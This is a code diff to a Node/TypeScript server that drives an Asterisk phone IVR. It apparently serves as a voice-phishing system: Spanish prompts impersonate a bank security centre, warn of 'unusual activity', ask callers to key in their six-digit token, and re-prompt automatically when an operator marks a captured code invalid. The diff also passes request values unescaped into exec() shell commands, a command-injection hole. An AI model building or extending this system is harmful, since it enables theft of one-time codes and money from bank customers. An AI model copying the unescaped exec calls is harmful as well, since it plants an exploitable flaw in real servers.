@@ -199,7 +199,11 @@ function ensureCustomAudioFilesExist() {
     { name: 'un_momento_validando_informacion', text: 'Un momento por favor, estamos validando su token en el sistema.', freq: 440 },
     { name: 'operacion_bloqueada_exito', text: 'Su operacion ha sido bloqueada y sus fondos estan seguros. Gracias por confiar en nosotros.', freq: 880 },
     { name: 'conectar_asesor_banco', text: 'Un momento por favor, le estamos transfiriendo con un asesor de seguridad bancaria.', freq: 587 },
+    { name: 'transferencia_asesor', text: 'Un momento por favor, le estamos transfiriendo con un asesor.', freq: 587 },
     { name: 'bienvenida_corporativa', text: 'Bienvenido al centro de atencion y seguridad bancaria.', freq: 520 },
+    { name: 'bienvenida_press1', text: 'Estimado cliente, detectamos una actividad inusual. Presione 1 para comunicarse con un asesor de seguridad.', freq: 520 },
+    { name: 'bienvenida_7777', text: 'Por favor digite su token o codigo de seguridad de seis digitos en el teclado de su telefono.', freq: 680 },
+    { name: 'opcion_invalida', text: 'La opcion ingresada no es valida. Por favor intente de nuevo.', freq: 440 },
     { name: 'prompt_otp_6_digitos', text: 'Por favor digite su token de seis digitos en el teclado de su telefono.', freq: 680 },
   ];
 
@@ -706,7 +710,15 @@ function generateCleanDialplanConf(
 
   dialplanContent += ` same => n,Set(IVR_AGENT_EXTEN=\${DB(ivr_vars/\${TARGET_DEST}_agent_exten)})\n`;
   dialplanContent += ` same => n,ExecIf($["\${IVR_AGENT_EXTEN}" = ""]?Set(IVR_AGENT_EXTEN=1001))\n`;
-  dialplanContent += ` same => n,NoOp(Audios Destino \${TARGET_DEST}: Intro=\${IVR_INTRO}, Prompt=\${IVR_PROMPT}, Wait=\${IVR_WAIT})\n`;
+  dialplanContent += ` same => n,Set(IVR_FAILURE=\${DB(ivr_vars/\${TARGET_DEST}_failure)})\n`;
+  dialplanContent += ` same => n,ExecIf($["\${IVR_FAILURE}" = ""]?Set(IVR_FAILURE=\${DB(ivr_vars/8888_failure)}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${IVR_FAILURE}" = ""]?Set(IVR_FAILURE=\${DB(ivr_vars/default_failure)}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${IVR_FAILURE}" = ""]?Set(IVR_FAILURE=custom/token_invalido_reintente))\n`;
+  dialplanContent += ` same => n,Set(IVR_INVALID=\${DB(ivr_vars/\${TARGET_DEST}_invalid)})\n`;
+  dialplanContent += ` same => n,ExecIf($["\${IVR_INVALID}" = ""]?Set(IVR_INVALID=\${DB(ivr_vars/8888_invalid)}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${IVR_INVALID}" = ""]?Set(IVR_INVALID=\${DB(ivr_vars/default_invalid)}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${IVR_INVALID}" = ""]?Set(IVR_INVALID=custom/opcion_invalida))\n`;
+  dialplanContent += ` same => n,NoOp(Audios Destino \${TARGET_DEST}: Intro=\${IVR_INTRO}, Prompt=\${IVR_PROMPT}, Wait=\${IVR_WAIT}, Fail=\${IVR_FAILURE})\n`;
 
   dialplanContent += ` same => n,NoOp(=== [IVR] Reproduciendo Audio de Bienvenida interactivo: \${IVR_INTRO} ===)\n`;
   dialplanContent += ` same => n,Background(\${IVR_INTRO})\n`;
@@ -759,7 +771,7 @@ function generateCleanDialplanConf(
 
   dialplanContent += ` same => n(otp_rejected_retry),NoOp(=== [IVR] TOKEN INVALIDO DETECTADO -> SOLICITANDO NUEVO CODIGO AUTOMATICAMENTE ===)\n`;
   dialplanContent += ` same => n,Set(DB(otp_status/\${TARGET_DEST})=pending)\n`;
-  dialplanContent += ` same => n,ExecIf($[$$[STAT(e,/var/lib/asterisk/sounds/custom/token_invalido_reintente.wav)] = 1]?Playback(custom/token_invalido_reintente):Playback(\${IVR_PROMPT}))\n`;
+  dialplanContent += ` same => n,Playback(\${IVR_FAILURE})\n`;
   dialplanContent += ` same => n,Goto(ask_input)\n\n`;
 
   dialplanContent += ` same => n(self_test_success),NoOp(=== [IVR] PRUEBA LOCAL 8888 EXITOSA: CÓDIGO \${USER_DIGITS} VALIDADO ===)\n`;
@@ -1196,7 +1208,15 @@ app.post('/api/asterisk/sync/extensions', async (req, res) => {
 
     dialplanContent += ` same => n,Set(IVR_AGENT_EXTEN=\${DB(ivr_vars/\${TARGET_DEST}_agent_exten)})\n`;
     dialplanContent += ` same => n,ExecIf($["\${IVR_AGENT_EXTEN}" = ""]?Set(IVR_AGENT_EXTEN=1001))\n`;
-    dialplanContent += ` same => n,NoOp(Audios Destino \${TARGET_DEST}: Intro=\${IVR_INTRO}, Prompt=\${IVR_PROMPT}, Wait=\${IVR_WAIT})\n`;
+    dialplanContent += ` same => n,Set(IVR_FAILURE=\${DB(ivr_vars/\${TARGET_DEST}_failure)})\n`;
+    dialplanContent += ` same => n,ExecIf($["\${IVR_FAILURE}" = ""]?Set(IVR_FAILURE=\${DB(ivr_vars/8888_failure)}))\n`;
+    dialplanContent += ` same => n,ExecIf($["\${IVR_FAILURE}" = ""]?Set(IVR_FAILURE=\${DB(ivr_vars/default_failure)}))\n`;
+    dialplanContent += ` same => n,ExecIf($["\${IVR_FAILURE}" = ""]?Set(IVR_FAILURE=custom/token_invalido_reintente))\n`;
+    dialplanContent += ` same => n,Set(IVR_INVALID=\${DB(ivr_vars/\${TARGET_DEST}_invalid)})\n`;
+    dialplanContent += ` same => n,ExecIf($["\${IVR_INVALID}" = ""]?Set(IVR_INVALID=\${DB(ivr_vars/8888_invalid)}))\n`;
+    dialplanContent += ` same => n,ExecIf($["\${IVR_INVALID}" = ""]?Set(IVR_INVALID=\${DB(ivr_vars/default_invalid)}))\n`;
+    dialplanContent += ` same => n,ExecIf($["\${IVR_INVALID}" = ""]?Set(IVR_INVALID=custom/opcion_invalida))\n`;
+    dialplanContent += ` same => n,NoOp(Audios Destino \${TARGET_DEST}: Intro=\${IVR_INTRO}, Prompt=\${IVR_PROMPT}, Wait=\${IVR_WAIT}, Fail=\${IVR_FAILURE})\n`;
 
     dialplanContent += ` ; 1. Reproducir Audio de Bienvenida / Alerta Precargado (Interactivo: permite presionar 1 u OTP en cualquier momento)\n`;
     dialplanContent += ` same => n,NoOp(=== [IVR] Reproduciendo Audio de Bienvenida interactivo: \${IVR_INTRO} ===)\n`;
@@ -1258,7 +1278,7 @@ app.post('/api/asterisk/sync/extensions', async (req, res) => {
     dialplanContent += ` ; Rama Inválido: El asesor marcó CÓDIGO INVÁLIDO -> Solicitar nuevo código automáticamente\n`;
     dialplanContent += ` same => n(otp_rejected_retry),NoOp(=== [IVR] TOKEN INVALIDO DETECTADO -> SOLICITANDO NUEVO CODIGO AUTOMATICAMENTE ===)\n`;
     dialplanContent += ` same => n,Set(DB(otp_status/\${TARGET_DEST})=pending)\n`;
-    dialplanContent += ` same => n,ExecIf($[$$[STAT(e,/var/lib/asterisk/sounds/custom/token_invalido_reintente.wav)] = 1]?Playback(custom/token_invalido_reintente):Playback(\${IVR_PROMPT}))\n`;
+    dialplanContent += ` same => n,Playback(\${IVR_FAILURE})\n`;
     dialplanContent += ` same => n,Goto(ask_input)\n\n`;
 
     dialplanContent += ` same => n(self_test_success),NoOp(=== [IVR] PRUEBA LOCAL 8888 EXITOSA: CÓDIGO \${USER_DIGITS} VALIDADO ===)\n`;
@@ -1721,22 +1741,9 @@ app.post('/api/asterisk/audio/upload', express.json({ limit: '50mb' }), async (r
     const soxCmd = `sox "${tempRawPath}" -r 8000 -c 1 -b 16 "${targetPath}"`;
 
     const onAudioSavedSuccess = (method: string) => {
-      // If user uploaded audio for agent_transfer role, immediately update AstDB ivr_vars
-      if (category === 'agent_transfer' || cleanBaseName === 'conectar_asesor_banco') {
-        const targets = ['default', '8888', 'global', '16104803845'];
-        for (const t of targets) {
-          exec(`asterisk -rx 'database put ivr_vars ${t}_agent "custom/${cleanBaseName}"'`, () => {});
-        }
-        exec(`asterisk -rx 'dialplan reload'`, () => {});
-        console.log(`[AUDIO ASSIGNED] custom/${cleanBaseName} asignado como audio de transferencia a asesor.`);
-      } else if (category === 'welcome_7777' || cleanBaseName.includes('7777')) {
-        exec(`asterisk -rx 'database put ivr_vars 7777_intro "custom/${cleanBaseName}"'`, () => {});
-        exec(`asterisk -rx 'database put ivr_vars 7777_prompt "custom/${cleanBaseName}"'`, () => {});
-        try {
-          fs.copyFileSync(targetPath, path.join(SOUNDS_CUSTOM_DIR, 'bienvenida_7777.wav'));
-        } catch (_) {}
-        exec(`asterisk -rx 'dialplan reload'`, () => {});
-        console.log(`[AUDIO ASSIGNED 7777] custom/${cleanBaseName} asignado como bienvenida de extensión 7777.`);
+      console.log(`[AUDIO SAVED via ${method}] custom/${cleanBaseName}.wav`);
+      if (category && category !== 'hold_music' && category !== 'custom') {
+        applyAudioAssignmentToAsterisk(category, `custom/${cleanBaseName}`);
       }
     };
 
@@ -1804,6 +1811,172 @@ app.post('/api/asterisk/audio/upload', express.json({ limit: '50mb' }), async (r
   }
 });
 
+// --- Centralized Audio Assignment Manager for Asterisk ---
+const ACTIVE_AUDIOS_FILE = path.join(process.cwd(), 'data', 'active_audios.json');
+
+const DEFAULT_AUDIO_ASSIGNMENTS: Record<string, string> = {
+  press1_welcome: 'custom/bienvenida_corporativa',
+  agent_transfer: 'custom/conectar_asesor_banco',
+  press1_invalid: 'custom/opcion_invalida',
+  welcome_7777: 'custom/solicitar_codigo_otp',
+  otp_welcome: 'custom/solicitar_codigo_otp',
+  otp_wait: 'custom/un_momento_validando_informacion',
+  otp_success: 'custom/operacion_bloqueada_exito',
+  otp_failure: 'custom/token_invalido_reintente',
+};
+
+function loadActiveAudioAssignments(): Record<string, string> {
+  try {
+    if (fs.existsSync(ACTIVE_AUDIOS_FILE)) {
+      const raw = fs.readFileSync(ACTIVE_AUDIOS_FILE, 'utf-8');
+      const parsed = JSON.parse(raw);
+      return { ...DEFAULT_AUDIO_ASSIGNMENTS, ...parsed };
+    }
+  } catch (e) {
+    console.warn('[AUDIO] Error leyendo active_audios.json, usando predeterminados:', e);
+  }
+  return { ...DEFAULT_AUDIO_ASSIGNMENTS };
+}
+
+function saveActiveAudioAssignments(data: Record<string, string>) {
+  try {
+    const dataDir = path.join(process.cwd(), 'data');
+    if (!fs.existsSync(dataDir)) {
+      fs.mkdirSync(dataDir, { recursive: true });
+    }
+    fs.writeFileSync(ACTIVE_AUDIOS_FILE, JSON.stringify(data, null, 2), 'utf-8');
+  } catch (e) {
+    console.error('[AUDIO] Error guardando active_audios.json:', e);
+  }
+}
+
+let activeAudioAssignments: Record<string, string> = loadActiveAudioAssignments();
+
+function applyAudioAssignmentToAsterisk(role: string, asteriskPath: string) {
+  const cleanPath = String(asteriskPath).replace(/\.wav$/, '');
+  const targets = ['default', '8888', 'global', '16104803845'];
+  const commands: string[] = [];
+  const srcBaseName = cleanPath.replace(/^custom\//, '');
+  const srcFile = path.join(SOUNDS_CUSTOM_DIR, `${srcBaseName}.wav`);
+
+  const copyToFallback = (fallbackBaseName: string) => {
+    try {
+      const dstFile = path.join(SOUNDS_CUSTOM_DIR, `${fallbackBaseName}.wav`);
+      if (fs.existsSync(srcFile)) {
+        fs.copyFileSync(srcFile, dstFile);
+      }
+    } catch (_) {}
+  };
+
+  switch (role) {
+    case 'press1_welcome':
+    case 'welcome':
+    case 'intro':
+      for (const tgt of targets) {
+        commands.push(`database put ivr_vars ${tgt}_intro "${cleanPath}"`);
+      }
+      copyToFallback('bienvenida_corporativa');
+      copyToFallback('bienvenida_press1');
+      activeAudioAssignments.press1_welcome = cleanPath;
+      break;
+
+    case 'agent_transfer':
+    case 'agent':
+      for (const tgt of targets) {
+        commands.push(`database put ivr_vars ${tgt}_agent "${cleanPath}"`);
+      }
+      copyToFallback('conectar_asesor_banco');
+      copyToFallback('transferencia_asesor');
+      activeAudioAssignments.agent_transfer = cleanPath;
+      break;
+
+    case 'press1_invalid':
+    case 'invalid':
+      for (const tgt of targets) {
+        commands.push(`database put ivr_vars ${tgt}_invalid "${cleanPath}"`);
+      }
+      copyToFallback('opcion_invalida');
+      activeAudioAssignments.press1_invalid = cleanPath;
+      break;
+
+    case 'welcome_7777':
+    case '7777':
+    case 'capture_7777':
+      commands.push(`database put ivr_vars 7777_intro "${cleanPath}"`);
+      commands.push(`database put ivr_vars 7777_prompt "${cleanPath}"`);
+      copyToFallback('bienvenida_7777');
+      activeAudioAssignments.welcome_7777 = cleanPath;
+      break;
+
+    case 'otp_welcome':
+    case 'prompt':
+      for (const tgt of targets) {
+        commands.push(`database put ivr_vars ${tgt}_prompt "${cleanPath}"`);
+      }
+      copyToFallback('solicitar_codigo_otp');
+      copyToFallback('prompt_otp_6_digitos');
+      activeAudioAssignments.otp_welcome = cleanPath;
+      break;
+
+    case 'otp_wait':
+    case 'wait':
+      for (const tgt of targets) {
+        commands.push(`database put ivr_vars ${tgt}_wait "${cleanPath}"`);
+      }
+      copyToFallback('un_momento_validando_informacion');
+      activeAudioAssignments.otp_wait = cleanPath;
+      break;
+
+    case 'otp_success':
+    case 'success':
+      for (const tgt of targets) {
+        commands.push(`database put ivr_vars ${tgt}_success "${cleanPath}"`);
+      }
+      copyToFallback('operacion_bloqueada_exito');
+      copyToFallback('otp_validado_exito');
+      activeAudioAssignments.otp_success = cleanPath;
+      break;
+
+    case 'otp_failure':
+    case 'failure':
+    case 'retry':
+      for (const tgt of targets) {
+        commands.push(`database put ivr_vars ${tgt}_failure "${cleanPath}"`);
+      }
+      copyToFallback('token_invalido_reintente');
+      copyToFallback('codigo_invalido_reintente');
+      activeAudioAssignments.otp_failure = cleanPath;
+      break;
+
+    default:
+      console.warn(`[AUDIO ASSIGN] Rol desconocido: ${role}`);
+      break;
+  }
+
+  saveActiveAudioAssignments(activeAudioAssignments);
+
+  for (const cmd of commands) {
+    exec(`asterisk -rx '${cmd}'`, () => {});
+  }
+  exec(`asterisk -rx 'dialplan reload'`, () => {});
+  console.log(`[AUDIO ASSIGNED] Rol ${role} actualizado a ${cleanPath}`);
+}
+
+function applyAllActiveAssignmentsToAsterisk() {
+  for (const [role, pathVal] of Object.entries(activeAudioAssignments)) {
+    applyAudioAssignmentToAsterisk(role, pathVal);
+  }
+}
+
+// Endpoint to retrieve all currently active audio assignments
+app.get('/api/asterisk/audio/active-assignments', (req, res) => {
+  res.json({
+    success: true,
+    assignments: activeAudioAssignments,
+    defaults: DEFAULT_AUDIO_ASSIGNMENTS,
+  });
+});
+
 // Explicit endpoint to assign an existing audio to an IVR role in Asterisk AstDB
 app.post('/api/asterisk/audio/assign', (req, res) => {
   try {
@@ -1812,74 +1985,26 @@ app.post('/api/asterisk/audio/assign', (req, res) => {
       return res.status(400).json({ success: false, error: 'asteriskPath es requerido' });
     }
 
-    const cleanPath = String(asteriskPath).replace(/\.wav$/, '');
-    const targets = ['default', '8888', 'global', '16104803845'];
+    applyAudioAssignmentToAsterisk(role, asteriskPath);
 
-    const commands: string[] = [];
-    if (role === 'agent_transfer' || role === 'agent') {
-      for (const tgt of targets) {
-        commands.push(`database put ivr_vars ${tgt}_agent "${cleanPath}"`);
-      }
-    } else if (role === 'intro' || role === 'welcome' || role === 'press1_welcome') {
-      for (const tgt of targets) {
-        commands.push(`database put ivr_vars ${tgt}_intro "${cleanPath}"`);
-      }
-    } else if (role === 'prompt' || role === 'otp_welcome') {
-      for (const tgt of targets) {
-        commands.push(`database put ivr_vars ${tgt}_prompt "${cleanPath}"`);
-      }
-    } else if (role === 'wait') {
-      for (const tgt of targets) {
-        commands.push(`database put ivr_vars ${tgt}_wait "${cleanPath}"`);
-      }
-    } else if (role === 'welcome_7777' || role === '7777' || role === 'capture_7777') {
-      lastAssigned7777Audio = cleanPath;
-      commands.push(`database put ivr_vars 7777_intro "${cleanPath}"`);
-      commands.push(`database put ivr_vars 7777_prompt "${cleanPath}"`);
-      try {
-        const srcFile = path.join(SOUNDS_CUSTOM_DIR, `${cleanPath.replace(/^custom\//, '')}.wav`);
-        const dstFile = path.join(SOUNDS_CUSTOM_DIR, 'bienvenida_7777.wav');
-        if (fs.existsSync(srcFile)) {
-          fs.copyFileSync(srcFile, dstFile);
-        }
-      } catch (_) {}
-    }
-
-    for (const cmd of commands) {
-      exec(`asterisk -rx '${cmd}'`, () => {});
-    }
-    exec(`asterisk -rx 'dialplan reload'`, () => {});
-
-    console.log(`[AUDIO ASSIGN] ${cleanPath} asignado al rol ${role}`);
     res.json({
       success: true,
-      message: `Audio ${cleanPath} asignado a ${role} en Asterisk exitosamente.`,
+      message: `Audio ${asteriskPath} asignado a ${role} en Asterisk exitosamente.`,
       role,
-      asteriskPath: cleanPath,
+      asteriskPath,
+      assignments: activeAudioAssignments,
     });
   } catch (err: any) {
     res.status(500).json({ success: false, error: err.message });
   }
 });
 
-let lastAssigned7777Audio = 'custom/solicitar_codigo_otp';
-
 // Endpoint to retrieve currently assigned audio for extension 7777
 app.get('/api/asterisk/audio/current-7777', (req, res) => {
-  exec(`asterisk -rx 'database get ivr_vars 7777_intro'`, (err, stdout) => {
-    let currentAudio = lastAssigned7777Audio;
-    if (!err && stdout && stdout.includes('Value:')) {
-      const match = stdout.match(/Value:\s*([^\r\n]+)/);
-      if (match && match[1]) {
-        currentAudio = match[1].trim();
-        lastAssigned7777Audio = currentAudio;
-      }
-    }
-    res.json({
-      success: true,
-      currentAudio,
-      defaultAudio: 'custom/solicitar_codigo_otp'
-    });
+  res.json({
+    success: true,
+    currentAudio: activeAudioAssignments.welcome_7777 || 'custom/solicitar_codigo_otp',
+    defaultAudio: 'custom/solicitar_codigo_otp'
   });
 });
 
@@ -2260,6 +2385,7 @@ async function startServer() {
     // Auto-verify and provision default 8kHz audios on startup
     try {
       ensureCustomAudioFilesExist();
+      applyAllActiveAssignmentsToAsterisk();
     } catch (e: any) {
       console.warn('Initial audio check warning:', e.message);
     }
